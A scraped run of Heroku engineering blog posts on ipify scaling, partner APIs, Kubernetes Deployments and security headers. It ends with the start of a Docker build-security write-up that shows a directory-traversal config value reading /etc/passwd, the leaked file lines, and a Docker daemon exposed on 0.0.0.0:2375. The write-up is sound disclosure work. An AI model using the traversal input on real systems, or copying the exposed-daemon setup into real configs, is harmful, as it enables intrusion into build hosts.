$50. When you need to scale horizontally, you have to move from hobby dynos to standard 1X dynos starting at $25/dyno/mo. I figured that by now the service had likely capped out in popularity and I was OK paying $50/mo, so I’d just do that and things would go back to normal. But… Things didn’t quite work out that way. Before even a week had passed, I was already getting alerts from Heroku telling me that I was having the same issue as before. When I looked at my stats, I could see that my traffic had doubled, and again it appeared like ipify was just simply getting too much usage.\nI added another dyno (brining my monthly cost up to ~$75/mo), but decided to investigate further. I’m a frugal guy – the idea of losing > $50/mo seemed unpleasant. The Investigation When I started investigating what was going on, the first thing I did was check to see how many requests per second (rps) ipify was actually getting. I was pretty surprised by the number: it was low . ipify was only getting around 10 rps at the time. When I saw how small the number was, I figured something bad must be happening in my code. If I can’t service 10 rps across two small web servers, I must be doing something horribly wrong. The first thing I noticed was that I was running a single Node process. This was an easy fix: I started using the Node cluster module , and bam, I was immediately running one process for each CPU core. This effectively doubled my throughput on my Heroku dynos. But 20 rps still seemed like a tiny number so I did some more digging. Instead of doing load testing on Heroku, I did some load testing locally on my laptop. My laptop was far stronger than a small 512M RAM Heroku dyno, so I figured I should see much better throughput. I did some testing using the ab tool and was surprised to see that even on my laptop I was unable to surpass a threshold of 30 rps from my Node processes (I run Linux on my laptop and ab works effectively there). I then did some basic profiling and found that Node was spending a lot of time performing basic string manipulation operations (to extract the IP address from the X-Forwarded-For header and clean it up). No matter what I experimented with, I was unable to boost throughput up much above that limit. At this point, the production ipify service was able to serve roughly 20 rps across two dynos. ipify was in total serving ~52 million requests/mo. Not impressive. I decided to rewrite the service in Go (which I had started using a few months before) for performance purposes to see whether or not I could get more throughput out of an equivalent Go server. ipify v1 Rewriting ipify in Go was a short (but fun) experiment. It gave me the opportunity to mess around with many different Go routing stacks: Gorilla/mux, Martini, and httprouter . After benchmarking and playing around with all three routing tools, I ended up using httprouter as it performed significantly better than the other two more popular options. On my laptop I was able to achieve ~2,500 rps from my Go server. A massive improvement. The memory footprint was also much lower and hovered around 5M. With my new found love for Go, I immediately took action and deployed my new Go-based ipify service on Heroku. The results were fantastic. I was able to get about ~2k rps of throughput from a single dyno! This brought my hosting back down to $25/mo and my total throughput to ~5.2 billion requests/mo. Several days later, while talking to a more experienced Go developer, I ended up rewriting some of my string handling functionality which netted me an extra ~1k RPS of throughput. At this point, I was able to sustain ~7.7 billion requests/mo per dyno (give or take a bit). I was thrilled to say the least. More Popularity Although I was able to cut back my hosting cost to a reasonable range for a short period of time, within roughly two months ipify started experiencing issues once more. It’s growth had continued to rise at an astounding rate. Around this time I had set up Google Alerts for ipify, so that I’d know when people mentioned it. I started getting notifications that more and more people started using ipify in their personal and work projects. I then began receiving email from companies asking if they can embed it in their products (including a large smart TV provider, numerous media agencies, IoT vendors, etc.). Before I knew it, ipify was servicing around 15 billion requests/mo and I was now back to spending $50/mo on hosting costs. I also started having issues with burst traffic – ipify would receive massive amounts of burst traffic for a short period of time that would die off quickly. I presumed this traffic was part of bootstrapping scripts, cron jobs, and other similar timed operations. I later discovered through user notifications that antivirus vendors started blocking ipify because it started getting used in root kits, viruses, and other nasty pieces of software. Attackers would use ipify to get the victim’s public IP address before firing it off to a central location to be used for malicious purposes. I suppose this sort of usage was responsible for a large amount of that burst traffic. While I’m not a fan of helping VX authors or spending money to assist them, I made the decision to keep ipify running neutrally to serve anyone who wants to use it. I’ve never been a fan of developer services that pick and choose what people use them for. I like to keep things simple. Which left me to deal with the burst traffic problem. Dealing with burst traffic was tricky because I primarily had two choices: Run additional dynos at a cost to myself and be always prepared for burst traffic, or Use an auto-scaling service like AdeptScale to automatically create and destroy dynos based on traffic patterns on my behalf I eventually decided to manually involve myself and go with option 1, simply because I didn’t want to spend any additional funds on another service (even though I’ve used AdeptScale’s service before, and it is fantastic). Around this time I was spending $150/mo and ipify was servicing ~25 billion requests/mo. Which brings us to the recent past. ipify Hits 30 Billion Requests per Month Over the past few months, ipify has hit a new record and surpassed 30 billion requests/mo on several occasions. It was an exciting milestone to surpass and something that has been fun to watch. Today, ipify routinely serves between 2k and 20k RPS (which is almost never consistent). Traffic is always variable and the usage is so routinely high that I’ve completely given up on trying to detect traffic patterns in any meaningful way. Average response time ranges between 1 and 20ms depending on traffic patterns. Today the service runs for between $150/mo and $200/mo depending on burst traffic and other factors. If I factor that into my calculator (assuming a $200/mo spend), ipify is able to service each request for total cost of $0.000000007. That’s astoundingly low. If you compare that to the expected cost of running the same service on a serverless or functions-as-a-service provider, ipify would cost thousands of dollars per month (as calculated here ). All in all, I’m extremely satisfied with ipify’s cost. It’s a frugal service that serves a simple purpose. ipify's Future Which leads me to the future. As ipify continues to grow, the service has gotten requests for a lot of different things: IPv6 support, better web design, other metadata about IP addresses, etc. As I’m incredibly busy with other projects nowadays, I ended up passing ownership of ipify along to my good friends at https://www.whoisxmlapi.com . Jonathan and team are good people working to build a portfolio of valuable and interesting developer API services. While I still help out with things from time-to-time, Jonathan and team are currently implementing new features for ipify, and working hard to roll out some pretty cool changes that I’m excited about (including an improved UI and more data endpoint). I look forward to seeing how ipify continues to grow over the coming years. A version of this post was originally published on Randall Degges’ personal blog . And, while we  might be biased, we'd be remiss if we didn’t recommend you check out Randall’s book, The Heroku Hacker’s Guide . go nodejs api performance ipify customer", "date": "2018-01-23,"},
{"website": "Heroku", "title": "Updated Platform API for Partners", "author": ["Arif Gursel"], "link": "https://blog.heroku.com/updated-platform-api-for-partners", "abstract": "Updated Platform API for Partners Posted by Arif Gursel January 24, 2018 Listen to this article The Platform API for Partners provides many official endpoints that the App Info API doesn’t support. These endpoints let you introspect security settings, discover other customer instances of the same add-on, and much more. Platform API for Partners endpoints are also more consistent and “better traveled.” Heroku uses these endpoints internally, and customers also use them directly. With the Platform API, add-ons have an OAuth client secret and a number of OAuth authorizations, one token per provisioned add-on. The OAuth client secret is only used to authenticate requests to create the scoped tokens; it is not used to authenticate other requests to the Platform API. All new add-ons that require Platform API functionality should access it via the Platform API for Partners. If you have an existing add-on that accesses Platform API endpoints via a different method, it’s recommended that you update your add-on to use the Platform API for Partners instead. Learn more in the Platform API for Partners announcement and check out the Platform API for Partners documentation for details on how resources returned from the API are scoped. addons partners integration api", "date": "2018-01-24,"},
{"website": "Heroku", "title": "FY18 Q4 recap: Platform API for Partners & New Partner Portal GA", "author": ["Arif Gursel"], "link": "https://blog.heroku.com/fy18-q4-recap-platform-api-for-partners-new-partner-portal-ga", "abstract": "FY18 Q4 recap: Platform API for Partners & New Partner Portal GA Posted by Arif Gursel January 26, 2018 Listen to this article Need to quickly catch up on this past quarter's announcements? Here are the top three topics to tune in on: The Platform API for Partners provides many official endpoints that allow you to introspect security settings, discover other customer instances of the same add-on, and much more. With the Platform API, add-ons have an OAuth client secret and a number of OAuth authorizations, one token per provisioned add-on; it is only used to authenticate requests to create the scoped tokens and not used to authenticate other requests to the Platform API. Updated password requirements for the add-on manifest go into effect as of December 15, 2017. Add-on manifest password values are required to be between 8 to 72 characters. Passwords will need to be compliant with these new rules in order to update add-on plans or other attributes. New Partner Portal for add-ons is generally available and offers an improved partner experience for building, managing, and updating Heroku add-ons. The new portal brings more functionality and an improved visual approach to creating and managing key aspects of your add-on offerings, such as Marketplace Listing, Features & Plans, and Reports. addons partners partner portal integration api manifest password requirements", "date": "2018-01-26,"},
{"website": "Heroku", "title": "Dissecting Kubernetes Deployments", "author": ["Damien Mathieu"], "link": "https://blog.heroku.com/dissecting-kubernetes-deployments", "abstract": "Dissecting Kubernetes Deployments Posted by Damien Mathieu February 22, 2018 Listen to this article Kubernetes is a container orchestration system that originated at Google, and is now being maintained by the Cloud Native Computing Foundation . In this post, I am going to dissect some Kubernetes internals—especially, Deployments and how gradual rollouts of new containers are handled. What Is a Deployment? This is how the Kubernetes documentation describes Deployments: A Deployment controller provides declarative updates for Pods and ReplicaSets. A Pod is a group of one or more containers which can be started inside a cluster. A pod started manually is not going to be very useful though, as it won't automatically be restarted if it crashes. A ReplicaSet ensures that a Pod specification is always running with a set number of replicas. They allow starting several instances of the same Pod and will restart them automatically if some of them were to crash. Deployments sit on top of ReplicaSets. They allow seamlessly rolling out new versions of an application. Here is an example of a rolling deploy in a basic app: What we can see in this video is a 10-Pods Deployment being rolled out, one Pod at a time. When an update is triggered, the Deployment will boot a new Pod and wait until that Pod is responding to requests. When that happens, it will terminate one Pod and boot a new one. This continues until all old Pods are stopped and we have 10 new ones running the updated Deployment. Let's see how that is handled under the covers. A Trigger-Based System Kubernetes is a trigger-based environment. When a Deployment is created or updated, its new status is stored in etcd . But without any controller to perform some action on the new object, nothing will happen. Anyone with the proper authorization access on a cluster can listen on some triggers and perform actions on them.  Let's take the following example: package main\n\nimport (\n  \"log\"\n  \"os\"\n  \"path/filepath\"\n  \"reflect\"\n  \"time\"\n\n  \"k8s.io/api/apps/v1beta1\"\n  metav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\n  \"k8s.io/apimachinery/pkg/runtime\"\n  \"k8s.io/apimachinery/pkg/watch\"\n  \"k8s.io/client-go/kubernetes\"\n  \"k8s.io/client-go/tools/cache\"\n  \"k8s.io/client-go/tools/clientcmd\"\n)\n\nfunc main() {\n  // doneCh will be used by the informer to allow a clean shutdown\n  // If the channel is closed, it communicates the informer that it needs to shutdown\n  doneCh := make(chan struct{})\n  // Authenticate against the cluster\n  client, err := getClient()\n  if err != nil {\n    log.Fatal(err)\n  }\n\n  // Setup the informer that will start watching for deployment triggers\n  informer := cache.NewSharedIndexInformer(&cache.ListWatch{\n    // This method will be used by the informer to retrieve the existing list of objects\n    // It is used during initialization to get the current state of things\n    ListFunc: func(options metav1.ListOptions) (runtime.Object, error) {\n      return client.AppsV1beta1().Deployments(\"default\").List(options)\n    },\n    // This method is used to watch on the triggers we wish to receive\n    WatchFunc: func(options metav1.ListOptions) (watch.Interface, error) {\n      return client.AppsV1beta1().Deployments(\"default\").Watch(options)\n    },\n  }, &v1beta1.Deployment{}, time.Second*30, cache.Indexers{}) // We only want `Deployments`, resynced every 30 seconds with the most basic indexer\n\n  // Setup the trigger handlers that will receive triggerss\n  informer.AddEventHandler(cache.ResourceEventHandlerFuncs{\n    // This method is executed when a new deployment is created\n    AddFunc: func(deployment interface{}) {\n      log.Printf(\"Deployment created: %s\", deployment.(*v1beta1.Deployment).ObjectMeta.Name)\n    },\n    // This method is executed when an existing deployment is updated\n    UpdateFunc: func(old, cur interface{}) {\n      if !reflect.DeepEqual(old, cur) {\n        log.Printf(\"Deployment updated: %s\", cur.(*v1beta1.Deployment).ObjectMeta.Name)\n      }\n    },\n  })\n\n  // Start the informer, until `doneCh` is closed\n  informer.Run(doneCh)\n  }\n\n// Create a client so we're allowed to perform requests\n// Because of the use of `os.Getenv(\"HOME\")`, this only works on unix environments\nfunc getClient() (*kubernetes.Clientset, error) {\n  config, err := clientcmd.BuildConfigFromFlags(\"\", filepath.Join(os.Getenv(\"HOME\"), \".kube\", \"config\"))\n    if err != nil {\n      return nil, err\n    }\n  return kubernetes.NewForConfig(config)\n} If you follow the comments in this code sample, you can see that we create an informer which listens on create and update Deployment triggers, and logs them to stdout . Back to the Deployment controller. When it is initialized , it configures a few informers to listen on: A Deployment creation A Deployment update A Deployment deletion A ReplicaSet creation A ReplicaSet update A ReplicaSet deletion A Pod deletion All those triggers allow the entire handling of a gradual rollout. Rolling Out For any of the mentioned triggers, the Deployment controller will do a Deployment sync . That method will check the Deployment status and perform the required action based on that. Let's take the example of a new Deployment. A Deployment Is Created The controller receives the creation trigger and performs a sync. After performing all of its checks, it looks for the Deployment strategy and triggers it. In our case, we're interested in a rolling update, as it's the one you should be using to prevent downtime. The rolloutRolling method will then create a new ReplicaSet. We need a new ReplicaSet for every rollout, as we want to be able to update the Pods one at a time. If the Deployment kept the same replica and just updated it, all Pods would be restarted and there would be a few minutes where we are unable to process requests. At this point, we have at least 2 ReplicaSets. One of them is the one we just created. The other one (there can be more if we have several concurrent rollouts) is the old one. We will then scale up and down both of the ReplicaSets accordingly. To scale up the new ReplicaSet, we start by looking how many replicas the Deployment expects. If we have scaled enough, we just stop there. If we need to\nkeep scaling up, we check the max surge value and compare it with the number of running Pods. If too many are running, it won't scale up and wait until some old Pods have finished terminating. Otherwise, it will boot the required number of new Pods. To scale down ,\nwe look at how many total Pods are running, subtract the maximum available Pods we want, then subtract any not fully booted Pods. Based on that, we know how many Pods need to be terminated and can randomly finish them. At this point, the controller has finished for the current trigger. The deployment itself is not over though. A ReplicaSet Is Updated Because the new Deployment just booted new Pods, we will receive new triggers. Specifically, when a Pod goes up or down, the ReplicaSet will send an update trigger. By listening on ReplicaSet updates, we can look for Pods that have finished booting or terminating. When that happens, we do the sync dance all over again, looking for Pods to shutdown and other ones to boot based on configuration, then wait for a new update. A ReplicaSet Is Deleted The ReplicaSet deleted trigger is used as a way to make sure all Deployments are always properly running. If a ReplicaSet is deleted and the Deployment didn't expect this, we need to perform a sync again to create a new one and bring the Pods back up. This means if you want to quickly restart your app (with downtime), you can delete a Deployment's ReplicaSet safely. A new one will be created right away. A Pod Is Deleted Deployments allow setting a ProgressDeadlineSeconds option. If the Deployment hasn't progressed (any Pod booted or stopped) after the set number of seconds, it will be marked as failed. This typically happens when Pods enter a crash loop. When that happens, we will never receive the ReplicaSet update, as the Pod never goes online. However, we will receive Pod deletion updates—one for each crash loop retry. By syncing here, we can check how long it's been since the last update and reliably mark the Deployment as failed after a while. The Deployment Is Finished If we consider the Deployment to be complete , we then clean things\nup . At cleanup, we will delete any ReplicaSet that became too old. We keep a set number of old ReplicaSets (without any Pod running) so we can rollback a broken Deployment. Note: ReplicaSets only hold a Pod template. So if you are always using the :latest tag for your Pod (or using the default one), you won't be rolling back anything. In order to have proper rollback here, you will need to change the container tag every time it is rebuilt. For example, you could tag the containers with the git commit SHA they were built against. You can rollback a deployment with the kubectl rollout undo command. To Infinity and Beyond While Kubernetes is a generally seen as a complex tool, it is not difficult to dissect its parts to understand how they work. Also, being as generic as it is is good, making the system extremely modular. For example, as we have seen in this post, it is very easy to listen for Deployment triggers and implement your own logic on top of them. Or to entirely reimplement them in your own controller (which would probably be a bad idea). This trigger-based system also makes things more straightforward as each controller doesn't need to regularly check for updates on the objects it owns. It just needs to listen on the appropriate triggers and perform the appropriate action. kubernetes k8s deployment", "date": "2018-02-22,"},
{"website": "Heroku", "title": "Using HTTP Headers to Secure Your Site", "author": ["Caleb Hearth"], "link": "https://blog.heroku.com/using-http-headers-to-secure-your-site", "abstract": "Using HTTP Headers to Secure Your Site Posted by Caleb Hearth March 01, 2018 Listen to this article Observatory by Mozilla helps websites by teaching developers, system administrators, and security professionals how to configure their sites safely and securely. Let's take a look at the scores Observatory gives for a fairly straightforward Static Buildpack app, https://2017.keeprubyweird.com . Test Scores Test Pass Score Explanation Content Security Policy ✗ -25 Content Security Policy (CSP) header not implemented Cookies ― 0 No cookies detected Cross-origin Resource Sharing ✔ 0 Content is not visible via cross-origin resource sharing (CORS) files or headers HTTP Public Key Pinning ― 0 HTTP Public Key Pinning (HPKP) header not implemented (optional) HTTP Strict Transport Security ✗ -20 HTTP Strict Transport Security (HSTS) header not implemented Redirection ✔ 0 Initial redirection is to https on same host, final destination is https Referrer Policy ― 0 Referrer-Policy header not implemented (optional) Subresource Integrity ― 0 Subresource Integrity (SRI) not implemented, but all scripts are loaded from a similar origin X-Content-Type-Options ✗ -5 X-Content-Type-Options header not implemented X-Frame-Options ✗ -20 X-Frame-Options (XFO) header not implemented X-XSS-Protection ✗ -10 X-XSS-Protection header not implemented Even though we use Heroku's Automated Certificate Management to easily get an SSL certificate for our domains, our overall score is an F, 20/100. We'll walk through each failing test, learn what caused the failure, and try to fix them. Content Security Policy (CSP) The failure here is \"CSP header not implemented\", and when we view the linked security guideline we see that CSP gives us control over where scripts and resources we reference on our site can be loaded from. For Keep Ruby Weird, this means fonts, several external image sources, and a couple of analytics sources. CSP gives us a few levels of strictness: default-src <source> , script-src <source> , object-src <source> , etc. These limit the sources of various types of resources. https: limit resources of the specified type, or all resources, to HTTPS only https://example.com limit resources to this domain. Multiple such sources can be provided for the same *-src directive. 'self' means that resources can only be loaded from the current host, useful for relative resources like <script src=\"/index.js\"> . See CSP: default-src on MDN for full options here. The Content-Security-Policy header disallows <script> tags with inline code by default. Those with a src instead are allowed. This can be disabled by adding 'unsafe-inline' which makes our site less secure. You can also specify nonce s or SHA sums of the content of those scripts to allow them to execute. frame-ancestors 'none' Prevents your site from being loaded in an iframe and being used in a clickjacking attack . If you do need to display your site in an iframe, you can specify URLs instead. For our purposes, we will want to be able to use self-hosted resources, images from Twitter and AWS, scripts from Google and Twitter analytics, and both a stylesheet and font entry from Google Fonts. We'll also need to re-define 'self' in a few directives because they don't fall back on the default unless the options aren't specified. For example, we haven't specified object-src so it falls back on the default-src value of 'self' . Content-Security-Policy: default-src 'self';\n                         script-src https://static.ads-twitter.com https://www.google-analytics.com;\n                         img-src 'self' https://s3.amazonaws.com https://twitter.com https://pbs.twimg.com;\n                         font-src 'self' https://fonts.gstatic.com;\n                         style-src 'self' https://fonts.googleapis.com;\n                         frame-ancestors 'none'; We can add this to our static.json as a part of the headers collection for all paths: # ...\n\"headers\": {\n  \"/**\": {\n    \"Content-Security-Policy\": \"default-src 'self'; script-src https://static.ads-twitter.com https://www.google-analytics.com; img-src 'self' https://s3.amazonaws.com https://twitter.com https://pbs.twimg.com; font-src 'self' https://fonts.gstatic.com; style-src 'self' https://fonts.googleapis.com; frame-ancestors 'none';\"\n  }\n} When we add or remove external resources, we'll need to update this collection or our users will see errors in the browser's console and the resources will be unavailable. HTTP Strict Transport Security (HSTS) We failed this test for basically the same reason: \"HTTP Strict Transport Security (HSTS) header not implemented\". HSTS tells a browser that our site should only be viewed over HTTPS. Looking at the HSTS security guideline, we see that HSTS provides several nonexclusive flags: max-age=<seconds> . How long user agents will redirect to HTTPS, in seconds. This tells a browser \"once you've seen this, assume that all requests to this domain will be over HTTPS for this long.\" Mozilla recommends 2 years, or 63072000 seconds. This flag is required. includeSubDomains . Whether user agents should upgrade requests on subdomains. Unless you have a reason you wouldn't have SSL on all subdomains, you probably want this. I'd recommend it even if you don't currently have subdomains. preload . If you have this flag and also register your domain on the Chrome HSTS preload list , browsers will not even need to see this header before forcing HTTPS requests. This is useful, but opt-in as you do need to register your own domain by looking it up on the preload list, checking some boxes, and submitting. It's pretty easy and we'll do it here. # ...\n\"headers\": {\n  \"/**\": {\n    \"Strict-Transport-Security\": \"max-age=63072000; includeSubDomains; preload\"\n  }\n} X-Content-Type-Options This header tells browsers not to load scripts and stylesheets if their MIME type as indicated by the server is incorrect. It's a good thing to have on. # ...\n\"headers\": {\n  \"/**\": {\n    \"X-Content-Type-Options\": \"nosniff\"\n  }\n} X-Frame-Options This header prevents your site from being loaded in an iframe. It helps prevent \"clickjacking\" attacks . It is the same protection offered by frame-ancestors 'none' in Content-Security-Policy but adds support for older browsers. If you do need to display your site in an iframe on another page of your site, you can instead use the SAMEORIGIN option. # ...\n\"headers\": {\n  \"/**\": {\n    \"X-Frame-Options\": \"DENY\"\n  }\n} X-XSS-Protection This header protects from cross-site scripting (XSS) attacks . It provides similar protection as Content-Security-Policy but again protects older browsers. # ...\n\"headers\": {\n  \"/**\": {\n    \"X-XSS-Protection\": \"1; mode=block\"\n  }\n} Putting It All Together Adding this header block to our static.json increases our score from an F to an A on the Observatory. \"headers\": {\n  \"/**\": {\n    \"Content-Security-Policy\": \"default-src 'self'; script-src https://static.ads-twitter.com https://www.google-analytics.com 'sha256-q2sY7jlDS4SrxBg6oq/NBYk9XVSwDsterXWpH99SAn0='; img-src 'self' https://s3.amazonaws.com https://twitter.com https://pbs.twimg.com; font-src 'self' https://fonts.gstatic.com; style-src 'self' https://fonts.googleapis.com; frame-ancestors 'none';\",\n    \"Strict-Transport-Security\": \"max-age=63072000; includeSubDomains; preload\",\n    \"X-Content-Type-Options\": \"nosniff\",\n    \"X-Frame-Options\": \"DENY\",\n    \"X-XSS-Protection\": \"1; mode=block\"\n  }\n} When we load up the browser, everything looks right! Unfortunately we did miss one thing, which we can see in the console. Refused to execute inline script because it violates the following Content Security Policy directive: \"script-src https://static.ads-twitter.com https://www.google-analytics.com \". Either the 'unsafe-inline' keyword, a hash ('sha256-q2sY7jlDS4SrxBg6oq/NBYk9XVSwDsterXWpH99SAn0='), or a nonce ('nonce-...') is required to enable inline execution. Even though we added https://www.google-analytics.com to our script-src, because\nit is being loaded in an inline script we'll need to allow it to be run\nexplicitly. The error message is kind enough to offer us a couple of options: \"Either the 'unsafe-inline' keyword, a hash ('sha256-q2sY7jlDS4SrxBg6oq/NBYk9XVSwDsterXWpH99SAn0='), or a nonce ('nonce-...') is required to enable inline execution.\" 'unsafe-inline' sounds, well, unsafe, so let's skip that. A nonce is a one-time-use number that would allow the inline script to be run. Nonces can be made safe, but as we're talking about static pages that's out of scope here. The hash provided in the error message is the actual sha-256 sum of the content of the inline code block, is more secure than the other options. It will keep attackers from changing the content of the Google Analytics inline script which makes it safer than an unprotected inline script. Like changing external dependencies, if we ever change that script tag we'll also need to change the sha-256 sum. \"Content-Security-Policy\": \"default-src 'self'; script-src https://static.ads-twitter.com https://www.google-analytics.com 'sha256-q2sY7jlDS4SrxBg6oq/NBYk9XVSwDsterXWpH99SAn0='; img-src 'self' https://s3.amazonaws.com https://twitter.com https://pbs.twimg.com; font-src 'self' https://fonts.gstatic.com; style-src 'self' https://fonts.googleapis.com; frame-ancestors 'none';\" We've added the SHA sum, and now Google Analytics is all set up! The Results Test Pass Score Explanation Content Security Policy ✔ +5 Content Security Policy (CSP) implemented without 'unsafe-inline' or 'unsafe-eval' Cookies ― 0 No cookies detected Cross-origin Resource Sharing ✔ 0 Content is not visible via cross-origin resource sharing (CORS) files or headers HTTP Public Key Pinning ― 0 HTTP Public Key Pinning (HPKP) header not implemented (optional) HTTP Strict Transport Security ✔ 0 HTTP Strict Transport Security (HSTS) header set to a minimum of six months (15768000) Redirection ✔ 0 Initial redirection is to https on same host, final destination is https Referrer Policy ✔ 0 Referrer-Policy header not implemented (optional) Subresource Integrity ― 0 Subresource Integrity (SRI) not implemented, but all scripts are loaded from a similar origin X-Content-Type-Options ✔ 0 X-Content-Type-Options header set to \"nosniff\" X-Frame-Options ✔ +5 X-Frame-Options (XFO) implemented via the CSP frame-ancestors directive X-XSS-Protection ✔ 0 X-XSS-Protection header set to \"1; mode=block\" We're up to A+! Not bad for an hour's work, and our users are much more secure\nnow when visiting our site. Extra Credit We're on the home stretch now. There are a few optional things we can do to beef\nup security and privacy even more. Referrer Policy Browsers include a Referrer header that identifies where a user came from when visiting a new page. It's useful in tracking where users are coming from, but there are some privacy concerns with that. The Referrer-Policy header controls when and how much information is provided. no-referrer . Tells the browser to never send the Referer header. same-origin . Send the referrer, but only on requests inside the site (e.g. /security-in-the-static-buildpack => /posts) strict-origin . Send the referrer information to all origins, but only the URL sans path (e.g. https://example.com/ ) strict-origin-when-cross-origin . Send full referrer information on same origin, but only the URL sans path on foreign origin. no-referrer can be used as a fallback for browsers as many of these options have not yet been implemented at this point. Referrer-Policy: no-referrer, strict-origin-when-cross-origin More? Mozilla Observatory also has tests for Cookies and Subresource Integrity , but it was happy with the Keep Ruby Weird site after the changes we've already made so those are left as an exercise for the reader. Final Result Here is the final result of this change, excluding the opt-in \"preload\"\ndirective to HSTS , and it is our recommendation for all static buildpack apps. {\n  \"headers\": {\n    \"/**\": {\n      \"Content-Security-Policy\": \"default-src 'self'; script-src https://static.ads-twitter.com https://www.google-analytics.com 'sha256-q2sY7jlDS4SrxBg6oq/NBYk9XVSwDsterXWpH99SAn0='; img-src 'self' https://s3.amazonaws.com https://twitter.com https://pbs.twimg.com; font-src 'self' https://fonts.gstatic.com; style-src 'self' https://fonts.googleapis.com; frame-ancestors 'none';\",\n      \"Referrer-Policy\": \"no-referrer, strict-origin-when-cross-origin\",\n      \"Strict-Transport-Security\": \"max-age=63072000; includeSubDomains\",\n      \"X-Content-Type-Options\": \"nosniff\",\n      \"X-Frame-Options\": \"DENY\",\n      \"X-XSS-Protection\": \"1; mode=block\"\n    }\n  }\n} static buildpack security mozilla", "date": "2018-03-01,"},
{"website": "Heroku", "title": "A House of Cards: An Exploration of Security When Building Docker Containers", "author": ["Etienne Stalmans"], "link": "https://blog.heroku.com/exploration-of-security-when-building-docker-containers", "abstract": "A House of Cards: An Exploration of Security When Building Docker Containers Posted by Etienne Stalmans March 08, 2018 Listen to this article Containers, specifically Docker, are all the rage. Most DevOps setups feature Docker somewhere in the CI pipeline. This likely means that any build environment you look at, will be using a container solution such as Docker. These build environments need to take untrusted user-supplied code and execute it. It makes sense to try and securely containerize this to minimize risk. In this post, we’re going to explore how a small misconfiguration in a build environment can create a severe security risk. It's important to note that this post does not describe any inherent vulnerability in Heroku, Docker, AWS CodeBuild, or containers in general, but discusses a misconfiguration issue that was found when reviewing a Docker container based, multi-tenant build environment. These technologies offer pretty solid security defaults out of the box, but when things start to get layered together, sometimes small misconfigurations can cause large issues. Building A possible build environment could have the following architecture: AWS CodeBuild for infrastructure \"hosting\" A Docker container in Docker build service The Docker container could be created through Dind and in theory, you end up with two containers that an attacker would need to escape. Using CodeBuild minimizes the attack surface further as you have single-use containers supplied by AWS, with no danger of tenants interacting with each other's build process. Let’s have a look at the proposed build process, and more specifically, how an attacker would be able to control the build process. The first thing to do in most build/CI pipelines would be to create a git repository with the code you wish to build and deploy. This would get packaged up and transferred to the build environment and then passed through to the docker build process. Looking at build services you usually find two ways a container can be provisioned - through a Dockerfile or a config.yml , both of which get bundled along with the source code. A CI config file, let's call it config-ci.yml , could look as follows: image: ruby:2.1\nservices:\n - postgres\n\nbefore_script:\n - bundle install\n\nafter_script:\n - rm secrets\n\nstages:\n - build\n - test\n - deploy This file then gets converted into a Dockerfile by the build process, before the rest of the build kicks off. In the case where you explicitly specify a Dockerfile to be used, you change the config-ci.yml to the following: docker:\n     web: Dockerfile_Web\n     worker: Dockerfile_Worker Where Dockerfile_Web and Dockerfile_Worker are the relative paths and names of the Dockerfiles in the source code repository. Now that the build information has been supplied, the build could be initiated. The build is normally started through a git push on the source repository. When this is initiated you would see output similar to the following: Counting objects: 22, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (21/21), done.\nWriting objects: 100% (22/22), 7.11 KiB | 7.11 MiB/s, done.\nTotal 22 (delta 11), reused 0 (delta 0)\nremote: Compressing source files... done.\nremote: Building source:\nremote: Downloading application source...\nremote: Sending build context to Docker daemon  19.97kB\nremote: Step 1/9 : FROM alpine:latest\nremote: latest: Pulling from library/alpine\nremote: b56ae66c2937: Pulling fs layer\nremote: b56ae66c2937: Download complete\nremote: b56ae66c2937: Pull complete\nremote: Digest: sha256:d6bfc3baf615209a8d607ba2a8103d9c8a405b3bd8741d88b4bef36478\nremote: Status: Downloaded newer image for alpine:latest\nremote:  ---> 053cde6e8953\nremote: Step 2/9 : RUN apk add --update --no-cache netcat-openbsd docker As you can see, we have the output of docker build -f Dockerfile . being returned to us, useful for debugging, but also useful for seeing possible attacks. Attacking Pre-Build The first idea that came to mind was to try and interrupt the build process before we even get into the docker build step. Alternatively, we could attempt to try and link in files from the CodeBuild environment, into our Docker build context. Since we controlled the config-ci.yml file contents, and more specifically the \"relative path to the Dockerfile to use\" , we could try an old fashioned directory traversal attack. The first attempt at this was to simply try and change the directory being used for the build: docker:\n   web: ../../../../../ Once the build process started, we immediately got the following error: Error response from daemon: unexpected error reading Dockerfile: read /var/lib/docker/tmp/docker-builder991278373/output: is a directory Interesting, we have caused an error and have a path leak. What happens if we try and \" read \" a file? docker:\n   web: ../../../../../../../etc/passwd And suddenly we have parsing errors from the Docker daemon. Unfortunately this will only give us the first line of files on the system. Nonetheless, an interesting start. Error response from daemon: Dockerfile parse error line 1: unknown instruction: ROOT:X:0:0:ROOT:/ROOT:/BIN/BASH\nt-\nError response from daemon: Dockerfile parse error line 1: unknown instruction: ROOT:*:17445:0:99999:7::: Another idea here could be to try and use symlinks to include files into our build. Fortunately, Docker prevents this, as it won't include files from outside the build directory into the build context. Attacking the Build: Vulnerability Found Time to go back to the actual build process and see what we could attack. A quick refresher: the build process is happening inside the dind Docker container, which is running inside a one-off CodeBuild instance. To further add to our layers, the docker build process runs all commands in one-off Docker containers. This is standard fare for Docker, each step of a Docker build is actually a new Docker container, as can be seen in the output from our build process. remote:  ---> 053cde6e8953\nremote: Step 2/9 : RUN apk add --update --no-cache netcat-openbsd docker\nremote:  ---> Running in e7e10023b1fc In the above case, step 2/9 is executed in a new Docker container e7e10023b1fc. So even if a user decides to insert some malicious code into the Dockerfile, they should be running in a one-off, isolated container, unable to do any damage. This is depicted below; When issuing Docker commands, these are actually passed to the dockerd daemon which is in-charge of creating/running/managing Docker images. For dind to work, it would need to be running its own Docker daemon. However, the way that dind is implemented it uses the host system's dockerd instance, allowing the host and dind to share Docker images and benefit from all the caching Docker does. What if Dind is started up with the following wrapper script: /usr/local/bin/dind dockerd \\\n   --host=unix:///var/run/docker.sock \\\n   --host=tcp://0.0.0.0:2375 \\\n   --storage-driver=overlay &>/var/log/docker.log Where /usr/local/bin/dind is simply a wrapper script to get Docker running inside a container. The wrapper script ensures that the Docker socket from the host is made available inside the container. This specific configuration introduces a security vulnerability. Normally the docker build process would have no way to interact with the Docker daemon, however, in this case, we are able to. The keen observer might notice that the TCP port for the dockerd daemon is also mapped through, --host=tcp://0.0.0.0:2375 . This misconfiguration sets the Docker daemon to listen on all interfaces of the container. This becomes an issue due to the way Docker networking functions. All containers are put into the same default Docker network unless otherwise specified. This means each container is able to communicate with each other container, without hindrance. Now during our build process, our temporary build container (the one executing user code) is able to issue network requests to the dind container hosting it. And because the dind container is simply reusing the host system's Docker daemon, we actually issue commands directly to the host system, AWS CodeBuild. When Dockerfiles Attack To test this, the 